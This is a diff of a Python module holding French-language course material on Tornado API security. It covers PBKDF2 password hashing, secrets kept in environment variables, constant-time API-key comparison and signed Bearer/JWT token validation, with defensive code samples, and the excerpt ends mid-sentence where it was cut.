@@ -15,61 +15,158 @@ ENRICHMENT_D4_D5 = {
     # =========================================================================
     "d4-l1": {
         "context": (
-            "Dès qu'une API dépasse le stade d'un prototype local, elle manipule des ressources sensibles : dossiers RH, "
-            "données financières, inscriptions officielles ou opérations d'administration. Ouvrir ces endpoints sans "
-            "mécanisme de contrôle d'accès revient à laisser la salle des serveurs ouverte sur la rue.\n"
-            "Pourtant, la majorité des failles de sécurité en entreprise ne proviennent pas d'attaques cryptographiques "
-            "complexes, mais de **trois erreurs d'architecture fondamentales** :\n"
-            "1. Confondre **encodage** (Base64), **hachage irréversible** (SHA-256 / PBKDF2) et **chiffrement** (AES).\n"
-            "2. Écrire des clés secrètes ou mots de passe en dur dans le code source Python (`git commit`), les exposant "
-            "définitivement dans l'historique du dépôt Git.\n"
-            "3. Comparer des secrets avec l'opérateur standard `==`, ouvrant la porte aux **attaques temporelles (Timing Attacks)**.\n"
-            "Ce chapitre pose les fondations cryptographiques rigoureuses indispensables à tout ingénieur backend Tornado."
+            "Dès qu'une interface de programmation dépasse le stade du prototype expérimental, elle devient le gardien "
+            "direct d'actifs critiques de l'institution : dossiers académiques nominatifs, écritures comptables, "
+            "attestations officielles ou opérations d'administration système. Exposer de tels `RequestHandlers` sur un "
+            "réseau TCP/IP sans architecture cryptographique rigoureuse revient à raccorder directement les tables de "
+            "la base de données à Internet sans contrôle d'identité ni preuve d'intégrité.\n\n"
+            "Or, les audits post-incident en entreprise révèlent une constante saisissante : l'immense majorité des "
+            "compromissions d'APIs ne résulte pas d'une cassure mathématique d'AES ou de SHA-256, mais d'erreurs "
+            "fondamentales d'ingénierie logicielle. Des développeurs confondent régulièrement la représentation "
+            "textuelle réversible (`Base64`) avec le hachage irréversible (`PBKDF2`), figent des clés maîtresses en "
+            "clair dans l'historique immuable de Git, bloquent l'`IOLoop` asynchrone de Tornado pendant le calcul "
+            "intensif des mots de passe, ou comparent des secrets avec l'opérateur `==` vulnérable aux attaques "
+            "temporelles (*Timing Side-Channel Attacks*). Ce chapitre établit les fondations cryptographiques et "
+            "opérationnelles exigées sur tout serveur Tornado de production."
         ),
         "deep_sections": [
             {
-                "heading": "1. La distinction fondamentale : Encodage vs Hachage vs Chiffrement vs Signature HMAC",
+                "heading": "1. Taxonomie cryptographique : Encodage, Hachage lent salé (`PBKDF2`) et Signature `HMAC` sous `IOLoop`",
                 "body": (
-                    "En ingénierie de sécurité, quatre opérations mathématiques sont régulièrement confondues par les développeurs débutants :\n"
-                    "- **L'Encodage (ex: `Base64`, `UTF-8`, `URL-encoding`)** : N'a **aucune vocation de sécurité**. Son unique "
-                    "but est de représenter des données binaires sous forme de caractères ASCII imprimables pour qu'elles traversent "
-                    "sans corruption les protocoles textuels comme HTTP ou JSON. N'importe qui peut décoder du Base64 instantanément sans clé.\n"
-                    "- **Le Hachage cryptographique (ex: `SHA-256`, `PBKDF2`, `bcrypt`, `Argon2`)** : Est une **fonction à sens unique (irréversible)**. "
-                    "À partir d'une entrée de taille quelconque, elle produit une empreinte de taille fixe (64 caractères hexadécimaux pour SHA-256). "
-                    "Il est mathématiquement impossible de retrouver le mot de passe d'origine à partir de son empreinte. Pour vérifier un mot de passe, "
-                    "on hache la saisie de l'utilisateur et on compare les deux empreintes.\n"
-                    "- **Le Salage (`Salt`) et dérivation lente (`PBKDF2` / `scrypt`)** : Si deux utilisateurs choisissent le même mot de passe, "
-                    "leur hash SHA-256 brut sera identique, permettant les attaques par tables précalculées (*Rainbow Tables*). On ajoute donc "
-                    "un **sel aléatoire unique** par mot de passe et on répète le hachage des centaines de milliers de fois (`hashlib.pbkdf2_hmac` "
-                    "de la bibliothèque standard) pour ralentir toute tentative de force brute par carte graphique (GPU).\n"
-                    "- **La Signature HMAC (`Hash-based Message Authentication Code`)** : Combine un message et une **clé secrète serveur** "
-                    "via une fonction de hachage pour prouver que le message n'a pas été falsifié en chemin."
+                    "En ingénierie des systèmes sûrs, quatre transformations mathématiques distinctes remplissent des "
+                    "contrats orthogonaux qu'il est impératif de ne jamais substituer l'une à l'autre. Leur maîtrise "
+                    "conditionne aussi bien la confidentialité des données au repos que la disponibilité du moteur "
+                    "événementiel de Tornado sous forte charge.\n\n"
+                    "#### Encodage de transport (`Base64`, `UTF-8`, `Percent-Encoding`) : zéro confidentialité\n\n"
+                    "Un schéma d'encodage comme `Base64` (RFC 4648) n'est pas un algorithme cryptographique et ne fait "
+                    "intervenir aucun secret. Son unique rôle consiste à projeter une séquence arbitraire d'octets "
+                    "binaires sur un alphabet restreint de 64 caractères ASCII imprimables afin qu'elle traverse sans "
+                    "altération des protocoles textuels tels que les en-têtes HTTP ou les documents JSON. Toute entité "
+                    "interceptant la chaîne invoque `base64.urlsafe_b64decode()` et retrouve instantanément l'intégralité "
+                    "du texte clair en temps constant.\n\n"
+                    "#### Fonctions de hachage rapide (`SHA-256`) vs dérivation lente salée (`PBKDF2-HMAC-SHA256`)\n\n"
+                    "Une fonction de hachage cryptographique projette un message de longueur arbitraire vers un condensat "
+                    "(*digest*) de taille fixe (32 octets, soit 64 chiffres hexadécimaux pour `SHA-256`) de manière "
+                    "mathématiquement irréversible (*preimage resistance*). Toutefois, `SHA-256` a été conçu pour être "
+                    "extrêmement rapide sur silicium : une grappe moderne de cartes graphiques (GPU) évalue plusieurs "
+                    "dizaines de milliards de condensats `SHA-256` par seconde et épuise en quelques minutes tout "
+                    "dictionnaire de mots de passe humains non salés ou précalculés dans des *Rainbow Tables*.\n\n"
+                    "Pour protéger des mots de passe humains en base de données, la norme NIST SP 800-132 impose deux "
+                    "contre-mesures conjointes : l'adjonction d'un **sel cryptographiquement aléatoire unique par "
+                    "enregistrement** (`secrets.token_bytes(16)`), qui garantit que deux utilisateurs choisissant le "
+                    "même mot de passe produisent deux condensats radicalement différents, et l'application d'une "
+                    "**fonction de dérivation de clé volontairement coûteuse en CPU** telle que `PBKDF2-HMAC-SHA256` "
+                    "(600 000 itérations recommandées par l'OWASP), `scrypt` ou `Argon2id`.\n\n"
+                    "> [!WARNING] Protection de l'IOLoop Tornado face au coût CPU de PBKDF2\n"
+                    "> Par conception, 600 000 itérations de `hashlib.pbkdf2_hmac` consomment entre 150 et 350 "
+                    "millisecondes de calcul arithmétique pur sur un cœur CPU. Dans un serveur Tornado mono-thread, "
+                    "exécuter cet appel directement sur le fil de l'`IOLoop` gèle l'intégralité des sockets `epoll` "
+                    "pendant un tiers de seconde : dix connexions simultanées sur `/api/auth/login` suffisent alors à "
+                    "paralyser le serveur pendant plus de trois secondes (déni de service asymétrique). En production, "
+                    "déportez systématiquement la dérivation `PBKDF2` ou `Argon2` dans un pool de threads dédié via "
+                    "`await IOLoop.current().run_in_executor(AUTH_EXECUTOR, verifier_mot_de_passe, clair, stocke)`.\n\n"
+                    "#### Code d'authentification de message (`HMAC`, RFC 2104)\n\n"
+                    "Contrairement au hachage nu où n'importe qui peut recalculer le condensat d'un message modifié, "
+                    "la construction `HMAC` (*Hash-based Message Authentication Code*) mêle cryptographiquement le "
+                    "message à une **clé secrète détenue par le serveur** à travers deux passes de hachage imbriquées. "
+                    "Elle fournit simultanément une preuve d'intégrité (aucun bit n'a été altéré sur le réseau) et une "
+                    "preuve d'authenticité (seul un détenteur de la clé secrète a pu forger cette étiquette).\n\n"
+                    "> « HMAC can be used in combination with any iterated cryptographic hash function. The cryptographic "
+                    "strength of HMAC depends upon the cryptographic strength of the underlying hash function, the size "
+                    "of its hash output, and on the size and quality of the key. » — IETF RFC 2104, Section 1 (Krawczyk, Bellare & Canetti, 1997)"
                 )
             },
             {
-                "heading": "2. La règle n°3 de la méthodologie Twelve-Factor App : Externalisation des Secrets (`os.environ`)",
+                "heading": "2. Gouvernance des secrets selon Twelve-Factor App : isolation par `os.environ`",
                 "body": (
-                    "Un code source applicatif est destiné à être partagé entre développeurs, audité dans GitLab/GitHub et analysé par des "
-                    "outils d'intégration continue (CI/CD). Si une clé d'API (`cookie_secret`, `SECRET_KEY`, mot de passe PostgreSQL) est écrite "
-                    "dans un fichier `.py`, même si vous la supprimez dans un commit ultérieur, **elle reste lisible à jamais dans l'historique Git (`git log -p`)**.\n"
-                    "- La norme industrielle impose de stocker les secrets dans les **variables d'environnement du système d'exploitation**.\n"
-                    "- En Python, le dictionnaire `os.environ` (du module standard `os`) permet de lire ces variables injectées au démarrage du "
-                    "conteneur Docker ou du service `systemd` : `os.environ.get(\"API_SECRET_KEY\")`.\n"
-                    "- En développement local uniquement, on utilise une valeur de secours (*fallback*) explicite ou un fichier `.env` ignoré par Git (`.gitignore`)."
+                    "Le code source applicatif d'une plateforme Tornado a vocation à être cloné sur les postes d'ingénierie, "
+                    "inspecté par des analyseurs statiques en intégration continue (CI/CD) et répliqué sur des dépôts "
+                    "Git distribués. Inscrire une clé cryptographique (`cookie_secret`, `JWT_SECRET_KEY`, identifiants "
+                    "PostgreSQL ou jeton d'API partenaire) sous forme de constante littérale dans un module `.py` constitue "
+                    "une vulnérabilité structurelle permanente : même si un commit ultérieur supprime la ligne fautive, "
+                    "l'objet blob contenant le secret demeure intégralement extractible dans le graphe d'historique Git "
+                    "via `git log -S` ou `git rev-list --all`.\n\n"
+                    "#### Injection par l'environnement du processus système (`os.environ`)\n\n"
+                    "Le troisième axiome de la méthodologie industrielle *Twelve-Factor App* stipule une séparation "
+                    "hermétique entre le code immuable et la configuration d'exécution dépendante du déploiement. "
+                    "Lorsqu'un gestionnaire de services Linux (`systemd`), un orchestrateur Kubernetes ou un démon Docker "
+                    "instancie un processus Python Tornado, le noyau Linux peuple en mémoire le bloc d'environnement "
+                    "privé du processus (`environ`), exposé en Python par le mapping `os.environ`.\n\n"
+                    "```python — Chargement défensif des secrets au démarrage de l'application Tornado\n"
+                    "import os\n"
+                    "import secrets\n\n"
+                    "def charger_secret_obligatoire(nom_variable: str, mode_dev: bool = False) -> bytes:\n"
+                    "    valeur = os.environ.get(nom_variable)\n"
+                    "    if valeur and len(valeur) >= 32:\n"
+                    "        return valeur.encode(\"utf-8\")\n"
+                    "    if mode_dev:\n"
+                    "        return secrets.token_bytes(32)\n"
+                    "    raise RuntimeError(\n"
+                    "        f\"Demarrage refuse : variable critique {nom_variable} absente ou entropie < 32 octets.\"\n"
+                    "    )\n"
+                    "```\n\n"
+                    "> [!IMPORTANT] Politique Fail-Fast au démarrage de Tornado\n"
+                    "> En production (`mode_dev=False`), n'acceptez jamais une valeur par défaut statique telle que "
+                    "`os.environ.get(\"SECRET_KEY\", \"dev-secret\")`. Si un opérateur déploie accidentellement un "
+                    "conteneur en omettant d'injecter le secret depuis Vault ou Kubernetes Secrets, l'application "
+                    "démarrerait silencieusement avec une clé publique connue de tous, permettant la forge immédiate "
+                    "de jetons administrateur et de cookies `set_secure_cookie`. L'absence du secret doit provoquer un "
+                    "arrêt immédiat (`RuntimeError`) avant même l'appel à `app.listen()`."
                 )
             },
             {
-                "heading": "3. Authentification Machine-to-Machine par `X-API-Key` et parade aux Timing Attacks (`hmac.compare_digest`)",
+                "heading": "3. Authentification Machine-to-Machine (`X-API-Key`) et neutralisation des Timing Attacks (`hmac.compare_digest`)",
                 "body": (
-                    "Lorsqu'un serveur partenaire (ex: le système de facturation d'une filiale) interroge votre API Tornado sans intervention humaine, "
-                    "le modèle le plus direct consiste à lui attribuer une **clé d'API (`API Key`)** transmise dans un en-tête HTTP dédié comme `X-API-Key`.\n"
-                    "- **Pourquoi ne jamais passer l'API Key dans l'URL (`?api_key=secret`) ?** Parce que les URLs complètes sont enregistrées en clair "
-                    "dans les journaux d'accès (logs Nginx, proxies d'entreprise, historique navigateur).\n"
-                    "- **Pourquoi `if cle_recue == cle_attendue:` est une faille critique ?** L'opérateur `==` compare les chaînes caractère par caractère "
-                    "et s'arrête dès la première différence (court-circuit). En mesurant le temps de réponse du serveur à la nanoseconde près sur des "
-                    "milliers de requêtes, un attaquant devine le premier caractère, puis le deuxième, et reconstitue toute la clé.\n"
-                    "- **La solution `hmac.compare_digest(a, b)`** : Cette fonction du module standard `hmac` compare tous les octets en **temps constant**, "
-                    "quel que soit le nombre de caractères exacts, neutralisant totalement l'attaque temporelle."
+                    "Dans les échanges automatisés de serveur à serveur (*Machine-to-Machine* ou *M2M*) — par exemple "
+                    "lorsque le progiciel comptable d'une filiale synchronise chaque nuit les écritures de facturation "
+                    "avec votre API Tornado — il n'existe aucun navigateur ni opérateur humain pour accomplir un flux "
+                    "interactif de connexion. L'architecture standard consiste à provisionner pour chaque système "
+                    "partenaire une **clé d'API à haute entropie** (`secrets.token_urlsafe(32)`, soit 256 bits d'aléa "
+                    "cryptographique) transportée exclusivement dans un en-tête HTTP dédié tel que `X-API-Key`.\n\n"
+                    "#### Pourquoi l'URL est un canal proscrit pour les secrets\n\n"
+                    "Transmettre une clé secrète dans la chaîne de requête (`GET /api/v1/rapports?api_key=isgp_live_...`) "
+                    "expose irrémédiablement le secret en texte clair dans au moins quatre couches d'infrastructure : "
+                    "les journaux d'accès `access.log` des répartiteurs Nginx et des passerelles CDN, les journaux "
+                    "automatiques `tornado.access` du serveur Python, l'historique local des outils de diagnostic, et "
+                    "l'en-tête HTTP `Referer` potentiellement fuité vers des ressources externes. À l'inverse, un "
+                    "en-tête HTTP `X-API-Key` circule à l'intérieur du tunnel chiffré TLS 1.3 et n'est jamais journalisé "
+                    "par défaut par les serveurs mandataires.\n\n"
+                    "#### Mécanique micro-architecturale de l'attaque temporelle (*Timing Side-Channel*) et `hmac.compare_digest`\n\n"
+                    "L'opérateur d'égalité natif `==` de Python sur les objets `str` et `bytes` est optimisé pour la "
+                    "vitesse d'exécution générale : sa boucle C interne compare les octets séquentiellement de l'indice "
+                    "`0` à `N-1` et retourne `False` **dès le premier octet divergent** (court-circuit logique). Cette "
+                    "optimisation crée un canal auxiliaire temporel mesurable. Un attaquant soumettant des dizaines de "
+                    "milliers de requêtes concurrentes vers une `IOLoop` Tornado très réactive observe statistiquement "
+                    "qu'un candidat dont le premier octet est exact met quelques dizaines de nanosecondes supplémentaires "
+                    "avant d'être rejeté ; il verrouille ainsi le premier caractère, puis le second, réduisant une "
+                    "complexité exponentielle `256^32` à une complexité linéaire triviale `256 * 32`.\n\n"
+                    "```python — Vérification M2M à temps constant et dérivation asynchrone dans Tornado\n"
+                    "import hashlib, hmac, os, secrets\n"
+                    "from concurrent.futures import ThreadPoolExecutor\n"
+                    "import tornado.ioloop\n"
+                    "import tornado.web\n\n"
+                    "CRYPTO_POOL = ThreadPoolExecutor(max_workers=4)\n\n"
+                    "def verifier_pbkdf2(clair: str, empreinte_stockee: str) -> bool:\n"
+                    "    _, algo, iter_s, sel_hex, hash_hex = empreinte_stockee.split(\"$\")\n"
+                    "    calcule = hashlib.pbkdf2_hmac(\n"
+                    "        algo, clair.encode(\"utf-8\"), bytes.fromhex(sel_hex), int(iter_s)\n"
+                    "    ).hex()\n"
+                    "    return hmac.compare_digest(calcule, hash_hex)\n\n"
+                    "class RapportPartenaireHandler(tornado.web.RequestHandler):\n"
+                    "    def prepare(self) -> None:\n"
+                    "        cle_recue = self.request.headers.get(\"X-API-Key\", \"\")\n"
+                    "        cle_attendue = os.environ.get(\"PARTNER_API_KEY\", \"\")\n"
+                    "        if not cle_attendue or not hmac.compare_digest(\n"
+                    "            cle_recue.encode(\"utf-8\"), cle_attendue.encode(\"utf-8\")\n"
+                    "        ):\n"
+                    "            self.set_status(401)\n"
+                    "            self.finish({\"erreur\": \"Cle d'API absente ou invalide\"})\n"
+                    "```\n\n"
+                    "La primitive standard `hmac.compare_digest(a, b)` exécute en langage C une accumulation bit à bit "
+                    "(`XOR` suivi d'un `OR` cumulatif sur chaque octet) sur toute la longueur des tampons lorsque leurs "
+                    "tailles coïncident, sans aucun branchement conditionnel dépendant des valeurs secrètes. Le temps CPU "
+                    "consommé devient rigoureusement indépendant de la position du premier octet erroné, neutralisant "
+                    "à la racine toute tentative d'inférence statistique par mesure de latence."
                 )
             }
         ],
@@ -120,8 +217,8 @@ ENRICHMENT_D4_D5 = {
             }
         ],
         "practical_exercises": [
-            "Générez deux empreintes successives du même mot de passe `\"Bootcamp2026\"` avec `hacher_mot_de_passe(\"Bootcamp2026\")` et affichez-les : expliquez pourquoi les deux chaînes obtenues sont totalement différentes et comment `verifier_mot_de_passe()` parvient malgré tout à valider les deux.",
-            "Créez un dictionnaire serveur associant trois clés d'API à trois noms d'applications partenaires, puis écrivez un `RequestHandler` qui identifie quel partenaire appelle l'API."
+            "Générez deux empreintes successives du même mot de passe `\"Bootcamp2026\"` à l'aide de la fonction `hacher_mot_de_passe(\"Bootcamp2026\")` puis inspectez leur structure interne séparée par `$` : démontrez comment l'extraction du sel hexadécimal embarqué permet à `verifier_mot_de_passe()` de recomposer exactement le même condensat sans jamais connaître le mot de passe initial en base.",
+            "Concevez dans Tornado un registre serveur associant les condensats `SHA-256` de trois clés d'API à trois profils d'applications partenaires, puis implémentez un `RequestHandler` qui identifie le partenaire appelant dans `prepare(self)` via `hmac.compare_digest` sans jamais conserver les clés partenaires en clair en mémoire."
         ]
     },
 
@@ -130,52 +227,126 @@ ENRICHMENT_D4_D5 = {
     # =========================================================================
     "d4-l2": {
         "context": (
-            "Lorsqu'un utilisateur humain se connecte depuis une application mobile ou une interface React/Vue, "
-            "on ne peut pas lui demander de ressaisir son mot de passe à chaque clic, ni stocker son mot de passe "
-            "en clair dans la mémoire du téléphone.\n"
-            "Dans une architecture d'API moderne distribuée sur 4 ou 50 instances Tornado derrière un répartiteur de charge "
-            "(Load Balancer Nginx), partager la mémoire RAM entre les processus serveurs devient un goulot d'étranglement.\n"
-            "La solution standard de l'industrie est l'authentification **Stateless par Jeton Signé (`Bearer Token` / `JWT`)** : "
-            "après avoir vérifié le mot de passe une seule fois sur `POST /api/auth/token`, le serveur délivre au client un "
-            "**passeport numérique infalsifiable et limité dans le temps**."
+            "Lorsqu'un opérateur humain interagit avec votre plateforme depuis une application mobile native ou une "
+            "interface monopage (SPA React ou Vue), l'architecture d'authentification doit concilier ergonomie, "
+            "sécurité et élasticité horizontale. Exiger la saisie du mot de passe à chaque action est inacceptable, "
+            "tandis que conserver ce mot de passe en mémoire sur le terminal client multiplie la surface de compromission.\n\n"
+            "Historiquement, les frameworks Web monolithiques maintenaient un dictionnaire de sessions en mémoire vive "
+            "serveur. Mais dès que l'on déploie un cluster de quatre à cinquante processus Tornado indépendants derrière "
+            "un répartiteur Nginx pour exploiter tous les cœurs CPU, la mémoire RAM locale n'est plus partagée : une "
+            "requête routée vers le nœud `8002` ignorerait tout d'une session ouverte une seconde plus tôt sur le nœud "
+            "`8001`. L'industrie résout cette contrainte d'échelle par l'authentification **sans état (*Stateless*) par "
+            "jeton signé (`Bearer Token` / `JWT`)** : après vérification initiale des identifiants, le serveur émet un "
+            "titre d'identité auto-porteur, horodaté et cryptographiquement scellé par signature `HMAC`, vérifiable en "
+            "quelques microsecondes par n'importe quel nœud Tornado sans aucun appel réseau ni lecture SQL."
         ),
         "deep_sections": [
             {
-                "heading": "1. Anatomie complète d'un jeton signé (Modèle JWT : `Header.Payload.Signature`)",
+                "heading": "1. Structure binaire et cryptographique d'un jeton signé (`Header.Payload.Signature`, RFC 7519)",
                 "body": (
-                    "Un jeton signé standard (comme un **JWT — JSON Web Token**, RFC 7519, ou un jeton signé `itsdangerous`) "
-                    "est composé de segments encodés en Base64URL séparés par des points `.` :\n"
-                    "1. **Le `Header` (En-tête)** : Décrit les métadonnées cryptographiques, notamment l'algorithme de signature utilisé (ex: `HS256` pour HMAC-SHA256).\n"
-                    "2. **Le `Payload` (Charge utile / `Claims`)** : Contient les déclarations d'identité et de droits de l'utilisateur sous forme d'objet JSON : "
-                    "`sub` (Subject : identifiant unique de l'utilisateur), `role` (`admin`, `formateur`), `iat` (*Issued At* : horodatage d'émission) et "
-                    "`exp` (*Expiration Time* : horodatage limite de validité).\n"
-                    "3. **La `Signature` cryptographique** : Le serveur calcule `HMAC_SHA256(Base64(Header) + \".\" + Base64(Payload), SECRET_KEY)`. "
-                    "Seul le serveur possède la `SECRET_KEY` en mémoire vive."
+                    "Qu'il suive le standard interopérable **JSON Web Token (JWT, RFC 7519)** ou le format compact "
+                    "`URLSafeTimedSerializer` de la bibliothèque `itsdangerous`, un jeton signé repose sur l'assemblage "
+                    "déterministe de segments sérialisés en `Base64URL` (variante sans caractères `+`, `/` ni remplissage "
+                    "`=` afin d'être sûre dans les en-têtes et URLs) séparés par le délimiteur ASCII point (`.`).\n\n"
+                    "#### Les trois segments canoniques du format JWT\n\n"
+                    "Le premier segment, appelé **`Header` (JOSE Header)**, encode un objet JSON minimal déclarant le "
+                    "type de jeton et l'algorithme cryptographique employé, typiquement `{\"alg\": \"HS256\", \"typ\": \"JWT\"}` "
+                    "pour `HMAC-SHA256`. Le deuxième segment, nommé **`Payload` (ensemble de *Claims*)**, transporte les "
+                    "assertions métier et temporelles : l'identifiant canonique du sujet (`sub`), ses attributs "
+                    "d'habilitation (`role`, `scopes`), l'horodatage Unix d'émission (`iat` — *Issued At*), l'identifiant "
+                    "unique du jeton (`jti`) et surtout la borne stricte d'expiration (`exp` — *Expiration Time*).\n\n"
+                    "Le troisième segment constitue le sceau d'intégrité : le serveur concatène les représentations "
+                    "`Base64URL` exactes des deux premiers segments jointes par un point, puis évalue "
+                    "`HMAC_SHA256(ascii(b64_header + \".\" + b64_payload), SECRET_KEY)`. Parce que seule la grappe de "
+                    "serveurs Tornado détient `SECRET_KEY` dans son espace `os.environ`, aucun client externe ne peut "
+                    "produire une signature valide pour un `Payload` arbitraire.\n\n"
+                    "> « JSON Web Token (JWT) is a compact, URL-safe means of representing claims to be transferred "
+                    "between two parties. The claims in a JWT are encoded as a JSON object that is used as the payload "
+                    "of a JSON Web Signature (JWS) structure, enabling the claims to be digitally signed or integrity "
+                    "protected with a Message Authentication Code (MAC). » — IETF RFC 7519, Section 1 (Jones, Bradley & Sakimura, 2015)"
                 )
             },
             {
-                "heading": "2. Vérité cruciale : Un jeton signé est LISIBLE par tous, mais INFALSIFIABLE (`Signé != Chiffré`)",
+                "heading": "2. L'invariant fondamental `Signé != Chiffré` : transparence du Payload et infalsifiabilité",
                 "body": (
-                    "C'est l'erreur de compréhension la plus fréquente lors des entretiens techniques et en production :\n"
-                    "- Le `Payload` d'un jeton JWT est simplement **encodé en Base64URL**, il n'est **PAS chiffré**.\n"
-                    "- Si vous copiez un jeton JWT sur un outil ou que vous exécutez `base64.urlsafe_b64decode()`, vous lirez en clair "
-                    "`{\"user_id\": 42, \"role\": \"lecteur\"}` sans avoir besoin de la clé secrète.\n"
-                    "- **Conséquence n°1 (Confidentialité)** : Ne mettez **JAMAIS** de données secrètes (mot de passe, numéro de carte bancaire, clé privée) "
-                    "à l'intérieur du Payload d'un jeton.\n"
-                    "- **Conséquence n°2 (Intégrité)** : Pourquoi un attaquant ne peut-il pas décoder son jeton, remplacer `\"lecteur\"` par `\"admin\"`, "
-                    "et le ré-encoder en Base64 ? Parce que dès qu'un seul bit du Payload change, la signature HMAC recalculée par le serveur "
-                    "ne correspondra plus à la signature attachée au jeton (`401 Unauthorized`)."
+                    "La confusion entre **signature cryptographique (JWS)** et **chiffrement (JWE)** figure parmi les "
+                    "causes les plus répandues de fuites de données sensibles dans les architectures d'API modernes. "
+                    "Un jeton signé garantit l'**intégrité** et l'**authenticité de l'émetteur**, mais il n'offre "
+                    "strictement **aucune confidentialité** vis-à-vis du porteur ou d'un observateur détenant le jeton.\n\n"
+                    "#### Démonstration d'inspection immédiate sans clé secrète\n\n"
+                    "Puisque le segment `Payload` est simplement converti en JSON puis encodé en `Base64URL`, n'importe "
+                    "quel script client, extension de navigateur ou opérateur réseau ayant capturé le jeton peut en "
+                    "extraire instantanément le contenu lisible sans posséder la `SECRET_KEY` du serveur. Il est donc "
+                    "formellement interdit d'embarquer dans les *claims* d'un jeton un condensat de mot de passe, un "
+                    "numéro fiscal confidentiel, des coordonnées bancaires ou un secret interne d'infrastructure.\n\n"
+                    "```http — Inspection d'un jeton Bearer circulant dans un en-tête HTTP\n"
+                    "GET /api/v1/auth/profil HTTP/1.1\n"
+                    "Host: api.isgp.dz\n"
+                    "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbWluZSIsInJvbGUiOiJsZWN0ZXVyIiwiZXhwIjoxNzYzNzQwODAwfQ.9vK8z_SignatureHMAC\n"
+                    "```\n\n"
+                    "#### Pourquoi la falsification d'élévation de privilèges échoue mathématiquement\n\n"
+                    "Si le `Payload` est lisible par l'utilisateur, qu'est-ce qui empêche un attaquant de décoder le "
+                    "deuxième segment, de remplacer `\"role\": \"lecteur\"` par `\"role\": \"admin\"`, de ré-encoder ce "
+                    "JSON modifié en `Base64URL` et de le renvoyer au serveur Tornado ? L'effet d'avalanche de `SHA-256` : "
+                    "la modification d'un seul bit dans le `Payload` bouleverse environ 50 % des bits du condensat "
+                    "`HMAC-SHA256` recalculé par Tornado à la réception. Ne connaissant pas `SECRET_KEY`, l'attaquant est "
+                    "incapable de calculer la nouvelle signature correspondante ; `hmac.compare_digest` constate la "
+                    "divergence et le `RequestHandler` rejette immédiatement la requête avec `401 Unauthorized`.\n\n"
+                    "> [!IMPORTANT] Ordre d'interception des exceptions temporelles et cryptographiques\n"
+                    "> Dans `itsdangerous` (comme dans `PyJWT` où `ExpiredSignatureError` hérite de `InvalidTokenError`), "
+                    "`SignatureExpired` est une sous-classe directe de `BadSignature`. Dans vos blocs `try / except` "
+                    "Tornado, interceptez toujours `SignatureExpired` **avant** `BadSignature` : inverser cet ordre "
+                    "masquerait les expirations légitimes sous des alertes de falsification cryptographique et priverait "
+                    "le client du signal précis lui indiquant de déclencher son flux de rafraîchissement."
                 )
             },
             {
-                "heading": "3. Le protocole d'échange `Authorization: Bearer <token>` dans un `RequestHandler` Tornado",
+                "heading": "3. Protocole `Authorization: Bearer` (RFC 6750) et extraction sans blocage dans Tornado",
                 "body": (
-                    "Le standard HTTP (RFC 6750) définit la manière exacte dont le client présente son jeton à chaque requête :\n"
-                    "- Le client ajoute l'en-tête HTTP : `Authorization: Bearer <jeton_signe>`.\n"
-                    "- Le mot-clé `Bearer` signifie littéralement **« Au porteur »** : quiconque détient ce jeton valide est considéré comme authentifié "
-                    "(d'où l'obligation absolue d'utiliser HTTPS en production pour empêcher l'écoute réseau).\n"
-                    "- Côté Tornado, le `RequestHandler` lit `self.request.headers.get(\"Authorization\", \"\")`, extrait le jeton après `\"Bearer \"`, "
-                    "et vérifie simultanément la signature cryptographique HMAC et l'horodatage d'expiration."
+                    "La spécification **IETF RFC 6750** normalise le transport des jetons d'accès dans HTTP/1.1 et HTTP/2 "
+                    "au moyen de l'en-tête `Authorization: Bearer <token>`. Le qualificatif anglais *Bearer* signifie "
+                    "littéralement « titre au porteur » : à l'image d'un billet de banque ou d'un ticket de transport "
+                    "magnétique, la simple détention du jeton suffit à prouver le droit d'accès, sans qu'aucune "
+                    "signature supplémentaire de la requête courante ne soit exigée. Ce modèle impose par conséquent "
+                    "l'usage exclusif de **TLS (`https://`)** en production afin qu'aucun équipement intermédiaire ne "
+                    "puisse capturer le jeton en transit.\n\n"
+                    "#### Validation CPU pure en microsecondes sur l'IOLoop\n\n"
+                    "Contrairement à `PBKDF2` qui est délibérément ralenti par 600 000 itérations lors du `POST /login` "
+                    "initial, la vérification d'un jeton signé sur les milliers de requêtes suivantes n'exécute **qu'une "
+                    "seule passe `HMAC-SHA256`** sur quelques centaines d'octets, soit moins de 5 microsecondes sur un "
+                    "processeur moderne. Cette propriété s'harmonise idéalement avec l'architecture non bloquante de "
+                    "Tornado : la validation dans `prepare(self)` ou `get_current_user(self)` s'effectue intégralement "
+                    "dans le cache L1 du processeur sans jamais solliciter le disque, le réseau ni la base SQL.\n\n"
+                    "```python — Validation stricte d'un en-tête RFC 6750 dans un RequestHandler Tornado\n"
+                    "from itsdangerous import URLSafeTimedSerializer, SignatureExpired, BadSignature\n"
+                    "import tornado.web\n\n"
+                    "class ProfilProtegeHandler(tornado.web.RequestHandler):\n"
+                    "    def prepare(self) -> None:\n"
+                    "        entete = self.request.headers.get(\"Authorization\", \"\")\n"
+                    "        schema, _, jeton = entete.partition(\" \")\n"
+                    "        if schema.lower() != \"bearer\" or not jeton.strip():\n"
+                    "            self.set_header(\"WWW-Authenticate\", 'Bearer realm=\"api.isgp.dz\"')\n"
+                    "            self.set_status(401)\n"
+                    "            self.finish({\"erreur\": \"Jeton Bearer requis dans l'en-tete Authorization\"})\n"
+                    "            return\n"
+                    "        serialiseur = URLSafeTimedSerializer(self.settings[\"jwt_secret\"], salt=\"access-v1\")\n"
+                    "        try:\n"
+                    "            self.current_user = serialiseur.loads(jeton.strip(), max_age=900)\n"
+                    "        except SignatureExpired:\n"
+                    "            self.set_header(\"WWW-Authenticate\", 'Bearer error=\"invalid_token\", error_description=\"Token expired\"')\n"
+                    "            self.set_status(401)\n"
+                    "            self.finish({\"erreur\": \"Le jeton d'acces a expire\"})\n"
+                    "        except BadSignature:\n"
+                    "            self.set_header(\"WWW-Authenticate\", 'Bearer error=\"invalid_token\"')\n"
+                    "            self.set_status(401)\n"
+                    "            self.finish({\"erreur\": \"Signature du jeton invalide ou altérée\"})\n"
+                    "```\n\n"
+                    "> [!TIP] Usage de `str.partition(\" \")` et conformité `WWW-Authenticate`\n"
+                    "> Préférez `entete.partition(\" \")` à `entete.split(\" \")` lors de l'analyse de l'en-tête "
+                    "`Authorization` : `partition` ne lève jamais `ValueError` sur une chaîne malformée et résiste aux "
+                    "espaces parasites. De plus, adjoindre l'en-tête normalisé `WWW-Authenticate: Bearer ...` sur toute "
